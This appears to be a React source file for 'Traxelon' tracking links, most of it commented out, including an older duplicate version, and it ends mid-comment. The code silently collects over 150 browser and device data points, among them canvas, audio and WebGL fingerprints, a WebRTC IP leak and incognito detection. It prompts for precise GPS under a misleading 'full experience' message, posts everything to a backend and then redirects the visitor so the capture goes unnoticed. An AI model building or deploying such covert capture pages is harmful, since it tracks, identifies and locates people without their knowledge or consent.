// /**
//  * TrackingCapture — /t/:token
//  *
//  * 1. Collects 150+ device/browser data points silently
//  * 2. Requests GPS via browser prompt (enableHighAccuracy: true)
//  * 3. POSTs everything to backend → backend does IP enrichment + Nominatim geocoding
//  * 4. Redirects to destination URL
//  */

// import React, { useEffect, useRef, useState } from "react";
// import { useParams } from "react-router-dom";
// import { useGeoGrabber } from "../hooks/useGeoGrabber";
// import { UAParser } from "ua-parser-js";

// // ── EXTRA: Identity + parsing helpers ─────────────────────────

// function generateFingerprintId(data) {
//   try {
//     const str = JSON.stringify(data);
//     let hash = 0;
//     for (let i = 0; i < str.length; i++) {
//       hash = (hash << 5) - hash + str.charCodeAt(i);
//       hash |= 0;
//     }
//     return "trx_" + Math.abs(hash);
//   } catch {
//     return null;
//   }
// }

// function getPluginsList() {
//   try {
//     return Array.from(navigator.plugins).map(p => p.name).join(", ");
//   } catch {
//     return null;
//   }
// }

// const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

// function getCaptureKey(token) {
//   return `traxelon_captured_v5_${token}`;
// }
// function getDestKey(token) {
//   return `traxelon_dest_v5_${token}`;
// }

// // ── Canvas fingerprint ──────────────────────────────────────────────────────
// function getCanvasFingerprint() {
//   try {
//     const canvas = document.createElement("canvas");
//     canvas.width = 200;
//     canvas.height = 50;
//     const ctx = canvas.getContext("2d");
//     ctx.textBaseline = "top";
//     ctx.font = "14px 'Arial'";
//     ctx.fillStyle = "#f60";
//     ctx.fillRect(125, 1, 62, 20);
//     ctx.fillStyle = "#069";
//     ctx.fillText("Traxelon🔍", 2, 15);
//     ctx.fillStyle = "rgba(102,204,0,0.7)";
//     ctx.fillText("Traxelon🔍", 4, 17);
//     const dataUrl = canvas.toDataURL();
//     let hash = 0;
//     for (let i = 0; i < dataUrl.length; i++) {
//       hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
//       hash |= 0;
//     }
//     return hash.toString(16);
//   } catch {
//     return null;
//   }
// }

// // ── WebGL GPU info + fingerprint ────────────────────────────────────────────
// function getGPUInfo() {
//   try {
//     const canvas = document.createElement("canvas");
//     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
//     if (!gl) return { gpu: null, gpuVendor: null, webglRenderer: null, webglVersion: null, webglShadingLanguageVersion: null, webglExtensions: null, webglMaxTextureSize: null, webglMaxViewportDims: null };
//     const ext = gl.getExtension("WEBGL_debug_renderer_info");
//     const extensions = gl.getSupportedExtensions() || [];
//     const maxViewport = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
//     return {
//       gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null : null,
//       gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null : null,
//       webglRenderer: gl.getParameter(gl.RENDERER) || null,
//       webglVendor: gl.getParameter(gl.VENDOR) || null,
//       webglVersion: gl.getParameter(gl.VERSION) || null,
//       webglShadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
//       webglExtensions: extensions.length,
//       webglMaxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
//       webglMaxViewportWidth: maxViewport ? maxViewport[0] : null,
//       webglMaxViewportHeight: maxViewport ? maxViewport[1] : null,
//       webglAntialiasing: gl.getContextAttributes()?.antialias ?? null,
//     };
//   } catch {
//     return { gpu: null, gpuVendor: null };
//   }
// }

// // ── Battery info ─────────────────────────────────────────────────────────────
// async function getBatteryInfo() {
//   try {
//     if (!navigator.getBattery) return {};
//     const battery = await navigator.getBattery();
//     return {
//       batteryLevel: Math.round(battery.level * 100),
//       batteryCharging: battery.charging,
//       batteryChargingTime: battery.chargingTime === Infinity ? null : battery.chargingTime,
//       batteryDischargingTime: battery.dischargingTime === Infinity ? null : battery.dischargingTime,
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Incognito detection ────────────────────────────────────────────────────
// async function detectIncognito() {
//   try {
//     if (navigator.storage && navigator.storage.estimate) {
//       const { quota } = await navigator.storage.estimate();
//       return quota < 120 * 1024 * 1024;
//     }
//     return null;
//   } catch {
//     return null;
//   }
// }

// // ── Network info ─────────────────────────────────────────────────────────────
// function getNetworkInfo() {
//   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
//   if (!conn) return {};
//   return {
//     connectionType: conn.effectiveType || null,
//     connectionDownlink: conn.downlink || null,
//     connectionDownlinkMax: conn.downlinkMax || null,
//     connectionRtt: conn.rtt || null,
//     connectionSaveData: conn.saveData || false,
//     connectionType2: conn.type || null,
//   };
// }

// async function getAudioFingerprint() {
//   return new Promise((resolve) => {
//     try {
//       const AudioContext = window.AudioContext || window.webkitAudioContext;
//       if (!AudioContext) { resolve(null); return; }
//       const ctx = new AudioContext();
//       // if (ctx.state === "suspended") { ctx.close(); resolve(null); return; }
//       if (ctx.state === "suspended") {
//         ctx.resume();
//       }
//       const oscillator = ctx.createOscillator();
//       const analyser = ctx.createAnalyser();
//       const gain = ctx.createGain();
//       const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
//       gain.gain.value = 0;
//       oscillator.type = "triangle";
//       oscillator.frequency.value = 10000;
//       oscillator.connect(analyser);
//       analyser.connect(scriptProcessor);
//       scriptProcessor.connect(gain);
//       gain.connect(ctx.destination);
//       oscillator.start(0);
//       scriptProcessor.onaudioprocess = (e) => {
//         const data = e.inputBuffer.getChannelData(0);
//         let sum = 0;
//         for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
//         resolve(sum.toString());
//         oscillator.stop();
//         ctx.close();
//       };
//       // Timeout fallback — if audio never processes, resolve null after 2s
//       setTimeout(() => resolve(null), 2000);
//     } catch {
//       resolve(null);
//     }
//   });
// }

// // ── Font detection ───────────────────────────────────────────────────────────
// function getAvailableFonts() {
//   try {
//     const testFonts = [
//       "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria",
//       "Comic Sans MS", "Courier New", "Georgia", "Helvetica", "Impact",
//       "Lucida Console", "Lucida Sans Unicode", "Microsoft Sans Serif",
//       "Palatino Linotype", "Segoe UI", "Tahoma", "Times New Roman",
//       "Trebuchet MS", "Verdana", "Roboto", "Open Sans", "Lato",
//       "Montserrat", "Ubuntu", "Noto Sans", "Noto Serif",
//     ];
//     const canvas = document.createElement("canvas");
//     const ctx = canvas.getContext("2d");
//     const baseFonts = ["monospace", "sans-serif", "serif"];
//     const testString = "mmmmmmmmmmlli";
//     const testSize = "72px";
//     const baseWidths = {};
//     baseFonts.forEach((baseFont) => {
//       ctx.font = `${testSize} ${baseFont}`;
//       baseWidths[baseFont] = ctx.measureText(testString).width;
//     });
//     const available = testFonts.filter((font) =>
//       baseFonts.some((baseFont) => {
//         ctx.font = `${testSize} '${font}', ${baseFont}`;
//         return ctx.measureText(testString).width !== baseWidths[baseFont];
//       })
//     );
//     return available.length;
//   } catch {
//     return null;
//   }
// }

// // ── Media devices ────────────────────────────────────────────────────────────
// async function getMediaDevices() {
//   try {
//     if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return {};
//     const devices = await navigator.mediaDevices.enumerateDevices();
//     return {
//       audioInputCount: devices.filter(d => d.kind === "audioinput").length,
//       audioOutputCount: devices.filter(d => d.kind === "audiooutput").length,
//       videoInputCount: devices.filter(d => d.kind === "videoinput").length,
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Storage info ──────────────────────────────────────────────────────────────
// async function getStorageInfo() {
//   try {
//     if (!navigator.storage || !navigator.storage.estimate) return {};
//     const { quota, usage } = await navigator.storage.estimate();
//     return {
//       storageQuota: quota ? Math.round(quota / 1024 / 1024) : null,
//       storageUsage: usage ? Math.round(usage / 1024 / 1024) : null,
//     };
//   } catch {
//     return {};
//   }
// }

// async function getWebRTCIP() {
//   return new Promise((resolve) => {
//     try {
//       const pc = new RTCPeerConnection({ iceServers: [] });
//       pc.createDataChannel("");
//       pc.createOffer().then(offer => pc.setLocalDescription(offer));

//       pc.onicecandidate = (event) => {
//         if (!event || !event.candidate) return;
//         const ip = event.candidate.candidate.split(" ")[4];
//         resolve(ip);
//       };

//       setTimeout(() => resolve(null), 2000);
//     } catch {
//       resolve(null);
//     }
//   });
// }

// function getNavigatorExtras() {
//   return {
//     pluginsCount: navigator.plugins ? navigator.plugins.length : null,
//     mimeTypesCount: navigator.mimeTypes ? navigator.mimeTypes.length : null,
//   };
// }

// function detectAdblock() {
//   try {
//     const bait = document.createElement("div");
//     bait.className = "adsbox";
//     bait.style.height = "1px";
//     document.body.appendChild(bait);

//     const blocked = bait.offsetHeight === 0;

//     document.body.removeChild(bait);
//     return blocked;
//   } catch {
//     return null;
//   }
// }

// function getInputCapabilities() {
//   return {
//     maxTouchPoints: navigator.maxTouchPoints || 0,
//     hasTouch: "ontouchstart" in window,
//     pointerFine: window.matchMedia("(pointer: fine)").matches,
//     pointerCoarse: window.matchMedia("(pointer: coarse)").matches,
//   };
// }

// // ── Browser permissions ───────────────────────────────────────────────────────
// async function getPermissions() {
//   const check = async (name) => {
//     try {
//       const result = await navigator.permissions.query({ name });
//       return result.state;
//     } catch {
//       return null;
//     }
//   };
//   try {
//     const [camera, microphone, notifications, geolocation, clipboard] = await Promise.all([
//       check("camera"),
//       check("microphone"),
//       check("notifications"),
//       check("geolocation"),
//       check("clipboard-read"),
//     ]);
//     return { permCamera: camera, permMicrophone: microphone, permNotifications: notifications, permGeolocation: geolocation, permClipboard: clipboard };
//   } catch {
//     return {};
//   }
// }

// // ── Browser feature detection ─────────────────────────────────────────────────
// function getBrowserFeatures() {
//   return {
//     // APIs available
//     hasServiceWorker: "serviceWorker" in navigator,
//     hasWebWorker: typeof Worker !== "undefined",
//     hasWebSocket: typeof WebSocket !== "undefined",
//     hasIndexedDB: !!window.indexedDB,
//     hasWebRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
//     hasCanvas: !!document.createElement("canvas").getContext,
//     hasWebGL: (() => { try { return !!document.createElement("canvas").getContext("webgl"); } catch { return false; } })(),
//     hasWebGL2: (() => { try { return !!document.createElement("canvas").getContext("webgl2"); } catch { return false; } })(),
//     hasBluetooth: !!navigator.bluetooth,
//     hasUSB: !!navigator.usb,
//     hasNFC: !!navigator.nfc,
//     hasGamepad: !!navigator.getGamepads,
//     hasVibration: !!navigator.vibrate,
//     hasGeolocation: !!navigator.geolocation,
//     hasBattery: !!navigator.getBattery,
//     hasDeviceMemory: !!navigator.deviceMemory,
//     hasHardwareConcurrency: !!navigator.hardwareConcurrency,
//     hasCredentials: !!navigator.credentials,
//     hasShare: !!navigator.share,
//     hasClipboard: !!navigator.clipboard,
//     hasWakeLock: !!navigator.wakeLock,
//     hasSpeechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
//     hasSpeechSynthesis: !!window.speechSynthesis,
//     hasPaymentRequest: !!window.PaymentRequest,
//     hasNotification: !!window.Notification,
//     hasPushManager: !!window.PushManager,
//     hasCrypto: !!window.crypto,
//     hasPerformance: !!window.performance,
//     hasIntersectionObserver: !!window.IntersectionObserver,
//     hasResizeObserver: !!window.ResizeObserver,
//     hasMutationObserver: !!window.MutationObserver,
//     hasRequestAnimationFrame: !!window.requestAnimationFrame,
//     hasFetch: !!window.fetch,
//     hasLocalStorage: (() => { try { localStorage.setItem("t", "1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
//     hasSessionStorage: (() => { try { sessionStorage.setItem("t", "1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
//   };
// }

// // ── Screen & display details ──────────────────────────────────────────────────
// function getScreenDetails() {
//   return {
//     screenOrientation: window.screen.orientation?.type || null,
//     screenOrientationAngle: window.screen.orientation?.angle ?? null,
//     isFullscreen: !!document.fullscreenElement,
//     documentVisibility: document.visibilityState || null,
//     screenIsExtended: window.screen.isExtended ?? null,
//   };
// }

// // ── Performance & timing ──────────────────────────────────────────────────────
// function getPerformanceInfo() {
//   try {
//     const nav = performance.getEntriesByType("navigation")[0];
//     return {
//       pageLoadTime: nav ? Math.round(nav.loadEventEnd - nav.fetchStart) : null,
//       domContentLoaded: nav ? Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) : null,
//       timeToFirstByte: nav ? Math.round(nav.responseStart - nav.fetchStart) : null,
//       deviceMemoryHeap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) : null,
//       usedJSHeap: performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) : null,
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Timezone & locale ────────────────────────────────────────────────────────
// function getTimezoneInfo() {
//   try {
//     const tz = Intl.DateTimeFormat().resolvedOptions();
//     return {
//       timezone: tz.timeZone || null,
//       timezoneOffset: new Date().getTimezoneOffset(),
//       locale: tz.locale || navigator.language || null,
//       hourCycle: tz.hourCycle || null,
//       calendar: tz.calendar || null,
//       numberingSystem: tz.numberingSystem || null,
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Math fingerprint (detects OS/CPU via floating point differences) ──────────
// function getMathFingerprint() {
//   try {
//     return {
//       mathSin: Math.sin(1),
//       mathCos: Math.cos(1),
//       mathTan: Math.tan(1),
//       mathLog: Math.log(5),
//       mathSqrt: Math.sqrt(2),
//       mathAsin: Math.asin(0.5),
//       mathSinh: Math.sinh(1),
//       mathCosh: Math.cosh(1),
//       mathExpm1: Math.expm1(1),
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Timeout helper ─────────────────────────────────────────
// function withTimeout(promise, ms = 1500) {
//   return Promise.race([
//     promise,
//     new Promise(resolve => setTimeout(() => resolve(null), ms))
//   ]);
// }

// // ── Collect ALL device info ───────────────────────────────────────────────────
// async function collectDeviceInfo() {
//   try {
//     const [battery, incognito, mediaDevices, storageInfo, permissions, audioFingerprint, webRTCIP] = await Promise.all([
//       getBatteryInfo(),
//       detectIncognito(),
//       getMediaDevices(),
//       getStorageInfo(),
//       getPermissions(),
//       withTimeout(getAudioFingerprint()),
//       withTimeout(getWebRTCIP()),
//     ]);

//     const gpuInfo = getGPUInfo();
//     const network = getNetworkInfo();
//     const canvasHash = getCanvasFingerprint();
//     const features = getBrowserFeatures();
//     const screenDetails = getScreenDetails();
//     const perfInfo = getPerformanceInfo();
//     const tzInfo = getTimezoneInfo();
//     const mathFP = getMathFingerprint();
//     const fontCount = getAvailableFonts();
//     const parser = new UAParser();
//     const result = parser.getResult();

//     // const parsed = parseUserAgent(navigator.userAgent);

//     const fingerprintBase = {
//       userAgent: navigator.userAgent,
//       screen: `${window.screen.width}x${window.screen.height}`,
//       gpu: gpuInfo.gpu,
//       cpu: navigator.hardwareConcurrency,
//       ram: navigator.deviceMemory,
//       platform: navigator.platform,
//     };

//     const fingerprintId = generateFingerprintId(fingerprintBase);

//     return {
//       // ── Hardware ──
//       cpuCores: navigator.hardwareConcurrency || null,
//       ram: navigator.deviceMemory || null,
//       maxTouchPoints: navigator.maxTouchPoints ?? null,
//       ...gpuInfo,

//       // ── Battery ──
//       batteryLevel: battery.batteryLevel ?? null,
//       batteryCharging: battery.batteryCharging ?? null,
//       batteryChargingTime: battery.batteryChargingTime ?? null,
//       batteryDischargingTime: battery.batteryDischargingTime ?? null,

//       // ── Screen & Display ──
//       screenWidth: window.screen.width,
//       screenHeight: window.screen.height,
//       screenAvailWidth: window.screen.availWidth || null,
//       screenAvailHeight: window.screen.availHeight || null,
//       colorDepth: window.screen.colorDepth || null,
//       pixelDepth: window.screen.pixelDepth || null,
//       pixelRatio: window.devicePixelRatio || null,
//       windowWidth: window.innerWidth || null,
//       windowHeight: window.innerHeight || null,
//       outerWidth: window.outerWidth || null,
//       outerHeight: window.outerHeight || null,
//       screenX: window.screenX ?? null,
//       screenY: window.screenY ?? null,
//       ...screenDetails,

//       // ── Browser ──
//       language: navigator.language || null,
//       languages: navigator.languages ? navigator.languages.join(", ") : null,
//       platform: navigator.platform || null,
//       cookiesEnabled: navigator.cookieEnabled ?? null,
//       doNotTrack: navigator.doNotTrack || null,
//       historyLength: window.history.length || null,
//       referrer: document.referrer || null,
//       userAgent: navigator.userAgent || null,
//       appName: navigator.appName || null,
//       appVersion: navigator.appVersion || null,
//       appCodeName: navigator.appCodeName || null,
//       product: navigator.product || null,
//       productSub: navigator.productSub || null,
//       vendor: navigator.vendor || null,
//       vendorSub: navigator.vendorSub || null,
//       onLine: navigator.onLine ?? null,
//       pdfViewerEnabled: navigator.pdfViewerEnabled ?? null,
//       javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
//       documentTitle: document.title || null,
//       documentCharset: document.characterSet || null,
//       documentCompatMode: document.compatMode || null,
//       documentReadyState: document.readyState || null,

//       // ── Network ──
//       ...network,

//       // ── Timezone & Locale ──
//       ...tzInfo,

//       // ── Storage ──
//       ...storageInfo,

//       // ── Media Devices ──
//       ...mediaDevices,

//       // ── Permissions ──
//       ...permissions,

//       // ── Performance ──
//       ...perfInfo,

//       // ── Privacy ──
//       incognito: incognito ?? null,

//       // ── Browser Features ──
//       ...features,

//       // ── Fingerprints ──
//       canvasHash,
//       audioFingerprint,
//       fontCount,

//       // ── Math fingerprint ──
//       ...mathFP,

//       // ── WebRTC ──
//       webRTCIP,

//       // ── Navigator extras ──
//       ...getNavigatorExtras(),

//       // ── Input / Touch ──
//       ...getInputCapabilities(),

//       // ── Adblock ──
//       adBlockEnabled: detectAdblock(),

//       // ── CSS Media Queries ──
//       prefersColorScheme: window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
//       prefersReducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
//       prefersContrast: window.matchMedia("(prefers-contrast: high)").matches ? "high" : "normal",
//       forcedColors: window.matchMedia("(forced-colors: active)").matches,
//       hoverCapability: window.matchMedia("(hover: hover)").matches ? "hover" : "none",
//       pointerType: window.matchMedia("(pointer: coarse)").matches ? "coarse" : window.matchMedia("(pointer: fine)").matches ? "fine" : "none",
//       anyHover: window.matchMedia("(any-hover: hover)").matches,
//       anyPointer: window.matchMedia("(any-pointer: coarse)").matches ? "coarse" : "fine",
//       displayMode: window.matchMedia("(display-mode: standalone)").matches ? "standalone" : window.matchMedia("(display-mode: fullscreen)").matches ? "fullscreen" : "browser",

//       // ── Page Context ──
//       pageUrl: window.location.href || null,
//       pageHostname: window.location.hostname || null,
//       pageProtocol: window.location.protocol || null,
//       pagePathname: window.location.pathname || null,
//       pageSearch: window.location.search || null,
//       pageHash: window.location.hash || null,
//       scrollX: window.scrollX ?? null,
//       scrollY: window.scrollY ?? null,
//       deviceScaleFactor: window.devicePixelRatio || null,

//       // ── NEW: Clean identity info ──
//       fingerprintId,

//       device: result.device.type || "Desktop",
//       browser: result.browser.name,
//       browserVersion: result.browser.version,
//       os: result.os.name,

//       // ── NEW: Extra environment detail ──
//       plugins: getPluginsList(),
//       timezoneOffsetMinutes: new Date().getTimezoneOffset(),
//       screenOrientationType: window.screen.orientation?.type || null,
//       screenOrientationAngle: window.screen.orientation?.angle ?? null,
//       colorGamut: window.matchMedia("(color-gamut: p3)").matches ? "p3" : "srgb",
//     };
//   } catch (err) {
//     console.error("collectDeviceInfo failed:", err);
//     return {}; // ← VERY IMPORTANT
//   }
// }

// // ─────────────────────────────────────────────────────────────────────────────

// export default function TrackingCapture() {
//   const { token } = useParams();
//   const [status, setStatus] = useState("📍 Allow location for full experience…");
//   const hasSent = useRef(false);

//   const { location, loading } = useGeoGrabber();

//   useEffect(() => {
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) {
//       const savedUrl = sessionStorage.getItem(getDestKey(token));
//       if (savedUrl) {
//         window.location.replace(savedUrl);
//       } else {
//         setStatus("⚠️ Link not found or has expired.");
//       }
//     }
//   }, [token]);

//   useEffect(() => {
//     if (loading) return;
//     if (hasSent.current) return;
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) return;

//     if (location?.source === "gps" && location?.lat != null) {
//       // GPS coords ready — send immediately
//       hasSent.current = true;
//       sessionStorage.setItem(key, "1");
//       sendCapture(location);
//     } else {
//       // GPS not ready yet — wait up to 8s then send whatever we have
//       const timer = setTimeout(() => {
//         if (hasSent.current) return;
//         hasSent.current = true;
//         sessionStorage.setItem(key, "1");
//         sendCapture(location);
//       }, 8000);
//       return () => clearTimeout(timer);
//     }
//     // eslint-disable-next-line react-hooks/exhaustive-deps
//   }, [loading, location]);

//   async function sendCapture(loc) {
//     setStatus("Redirecting…");
//     let destinationUrl = null;

//     try {
//       const deviceInfoPromise = collectDeviceInfo();
//       const deviceInfo = await deviceInfoPromise;

//       const payload = {
//         token,
//         gpsLat: loc?.source === "gps" ? (loc?.lat ?? null) : null,
//         gpsLon: loc?.source === "gps" ? (loc?.lon ?? null) : null,
//         gpsAccuracy: loc?.source === "gps" ? (loc?.gpsAccuracy ?? null) : null,
//         ...deviceInfo,
//       };
//       console.log("🚀 PAYLOAD:", payload);

//       const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       });

//       const data = await res.json();
//       destinationUrl = data?.destinationUrl ?? null;
//     } catch (err) {
//       console.error("[TrackingCapture] error:", err);
//       setStatus("⚠️ Could not reach the destination. The link may be invalid or expired.");
//       return;
//     }

//     if (destinationUrl) {
//       sessionStorage.setItem(getDestKey(token), destinationUrl);
//       window.location.replace(destinationUrl);
//     } else {
//       setStatus("⚠️ Link not found or has expired. Please check the link and try again.");
//     }
//   }

//   return (
//     <div
//       style={{
//         minHeight: "100vh",
//         display: "flex",
//         flexDirection: "column",
//         alignItems: "center",
//         justifyContent: "center",
//         background: "#ffffff",
//         fontFamily: "sans-serif",
//       }}
//     >
//       <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
//         <div
//           style={{
//             width: 36,
//             height: 36,
//             border: "3px solid #f0f0f0",
//             borderTop: "3px solid #4a90e2",
//             borderRadius: "50%",
//             margin: "0 auto 16px",
//             animation: "spin 0.9s linear infinite",
//           }}
//         />
//         <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
//       </div>
//       <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
//     </div>
//   );
// }

// /**
//  * TrackingCapture — /t/:token
//  *
//  * 1. Collects 30+ device/browser data points silently
//  * 2. Requests GPS via browser prompt (enableHighAccuracy: true)
//  * 3. POSTs everything to backend → backend does IP enrichment + Nominatim geocoding
//  * 4. Redirects to destination URL
//  */

// import React, { useEffect, useRef, useState } from "react";
// import { useParams } from "react-router-dom";
// import { useGeoGrabber } from "../hooks/useGeoGrabber";

// const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

// // Bump version to clear old sessionStorage captures
// function getCaptureKey(token) {
//   return `traxelon_captured_v4_${token}`;
// }
// function getDestKey(token) {
//   return `traxelon_dest_v4_${token}`;
// }


// // ── Canvas fingerprint ──────────────────────────────────────────────────────
// function getCanvasFingerprint() {
//   try {
//     const canvas = document.createElement("canvas");
//     canvas.width = 200;
//     canvas.height = 50;
//     const ctx = canvas.getContext("2d");
//     ctx.textBaseline = "top";
//     ctx.font = "14px 'Arial'";
//     ctx.fillStyle = "#f60";
//     ctx.fillRect(125, 1, 62, 20);
//     ctx.fillStyle = "#069";
//     ctx.fillText("Traxalon🔍", 2, 15);
//     ctx.fillStyle = "rgba(102,204,0,0.7)";
//     ctx.fillText("Traxalon🔍", 4, 17);
//     const dataUrl = canvas.toDataURL();
//     // Simple hash
//     let hash = 0;
//     for (let i = 0; i < dataUrl.length; i++) {
//       hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
//       hash |= 0;
//     }
//     return hash.toString(16);
//   } catch {
//     return null;
//   }
// }

// // ── WebGL GPU info ──────────────────────────────────────────────────────────
// function getGPUInfo() {
//   try {
//     const canvas = document.createElement("canvas");
//     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
//     if (!gl) return { gpu: null, gpuVendor: null };
//     const ext = gl.getExtension("WEBGL_debug_renderer_info");
//     if (!ext) return { gpu: null, gpuVendor: null };
//     return {
//       gpu: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null,
//       gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null,
//     };
//   } catch {
//     return { gpu: null, gpuVendor: null };
//   }
// }

// // ── Battery info ─────────────────────────────────────────────────────────────
// async function getBatteryInfo() {
//   try {
//     if (!navigator.getBattery) return {};
//     const battery = await navigator.getBattery();
//     return {
//       batteryLevel: Math.round(battery.level * 100),
//       batteryCharging: battery.charging,
//     };
//   } catch {
//     return {};
//   }
// }

// // ── Private/incognito detection (storage quota heuristic) ────────────────────
// async function detectIncognito() {
//   try {
//     if (navigator.storage && navigator.storage.estimate) {
//       const { quota } = await navigator.storage.estimate();
//       // Incognito mode typically limits quota to ~120MB
//       return quota < 120 * 1024 * 1024;
//     }
//     return null;
//   } catch {
//     return null;
//   }
// }

// // ── Network info ─────────────────────────────────────────────────────────────
// function getNetworkInfo() {
//   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
//   if (!conn) return {};
//   return {
//     connectionType: conn.effectiveType || null,     // "4g", "3g", "wifi" etc.
//     connectionDownlink: conn.downlink || null,       // Mbps
//     connectionRtt: conn.rtt || null,                // ms
//     connectionSaveData: conn.saveData || false,
//   };
// }

// // ── Collect ALL device info ───────────────────────────────────────────────────
// async function collectDeviceInfo() {
//   const [battery, incognito] = await Promise.all([
//     getBatteryInfo(),
//     detectIncognito(),
//   ]);
//   const { gpu, gpuVendor } = getGPUInfo();
//   const network = getNetworkInfo();
//   const canvasHash = getCanvasFingerprint();

//   return {
//     // Hardware
//     cpuCores: navigator.hardwareConcurrency || null,
//     ram: navigator.deviceMemory || null,              // GB (approximate)
//     gpu,
//     gpuVendor,
//     maxTouchPoints: navigator.maxTouchPoints ?? null,

//     // Battery
//     batteryLevel: battery.batteryLevel ?? null,
//     batteryCharging: battery.batteryCharging ?? null,

//     // Screen & Display
//     screenWidth: window.screen.width,
//     screenHeight: window.screen.height,
//     screenAvailWidth: window.screen.availWidth || null,
//     screenAvailHeight: window.screen.availHeight || null,
//     colorDepth: window.screen.colorDepth || null,
//     pixelDepth: window.screen.pixelDepth || null,
//     pixelRatio: window.devicePixelRatio || null,
//     windowWidth: window.innerWidth || null,
//     windowHeight: window.innerHeight || null,

//     // Browser
//     language: navigator.language || null,
//     languages: navigator.languages ? navigator.languages.join(", ") : null,
//     platform: navigator.platform || null,
//     cookiesEnabled: navigator.cookieEnabled ?? null,
//     doNotTrack: navigator.doNotTrack || null,
//     historyLength: window.history.length || null,
//     referrer: document.referrer || null,

//     // Network
//     ...network,

//     // Privacy
//     incognito: incognito ?? null,

//     // Fingerprint
//     canvasHash,
//   };
// }

// // ─────────────────────────────────────────────────────────────────────────────

// export default function TrackingCapture() {
//   const { token } = useParams();
//   const [status, setStatus] = useState("📍 Allow location for full experience…");
//   const hasSent = useRef(false);

//   // Requests GPS with enableHighAccuracy: true, falls back to IP if denied
//   const { location, loading } = useGeoGrabber();

//   // If already captured this session, redirect immediately using saved URL
//   useEffect(() => {
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) {
//       const savedUrl = sessionStorage.getItem(getDestKey(token));
//       if (savedUrl) {
//         window.location.replace(savedUrl);
//       } else {
//         // Captured but no destination saved (e.g. old session key)
//         setStatus("⚠️ Link not found or has expired.");
//       }
//     }
//   }, [token]);

//   useEffect(() => {
//     if (loading) return;
//     if (hasSent.current) return;
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) return;

//     hasSent.current = true;
//     sessionStorage.setItem(key, "1");
//     sendCapture(location); // ← pass current location value explicitly
//     // eslint-disable-next-line react-hooks/exhaustive-deps
//   }, [loading]);

//   async function sendCapture(loc) {   // ← receive as parameter, NOT from closure
//     setStatus("Redirecting…");
//     let destinationUrl = null;

//     try {
//       const deviceInfo = await collectDeviceInfo();

//       const payload = {
//         token,

//         // GPS raw coords — read from the parameter, not the closure
//         gpsLat: loc?.source === "gps" ? (loc?.lat ?? null) : null,
//         gpsLon: loc?.source === "gps" ? (loc?.lon ?? null) : null,
//         gpsAccuracy: loc?.source === "gps" ? (loc?.gpsAccuracy ?? null) : null,

//         // All device info
//         ...deviceInfo,
//       };

//       const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       });

//       const data = await res.json();
//       destinationUrl = data?.destinationUrl ?? null;
//     } catch (err) {
//       console.error("[TrackingCapture] error:", err);
//       setStatus("⚠️ Could not reach the destination. The link may be invalid or expired.");
//       return;
//     }

//     if (destinationUrl) {
//       // Save the destination URL so revisits can redirect instantly
//       sessionStorage.setItem(getDestKey(token), destinationUrl);
//       window.location.replace(destinationUrl);
//     } else {
//       setStatus("⚠️ Link not found or has expired. Please check the link and try again.");
//     }
//   }


//   return (
//     <div
//       style={{
//         minHeight: "100vh",
//         display: "flex",
//         flexDirection: "column",
//         alignItems: "center",
//         justifyContent: "center",
//         background: "#ffffff",
//         fontFamily: "sans-serif",
//       }}
//     >
//       <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
//         <div
//           style={{
//             width: 36,
//             height: 36,
//             border: "3px solid #f0f0f0",
//             borderTop: "3px solid #4a90e2",
//             borderRadius: "50%",
//             margin: "0 auto 16px",
//             animation: "spin 0.9s linear infinite",
//           }}
//         />
//         <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
//       </div>
//       <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
//     </div>
//   );
// }


/**
 * TrackingCapture — /t/:token
 *
 * 1. Collects 150+ device/browser data points silently
 * 2. Requests GPS via browser prompt (enableHighAccuracy: true)
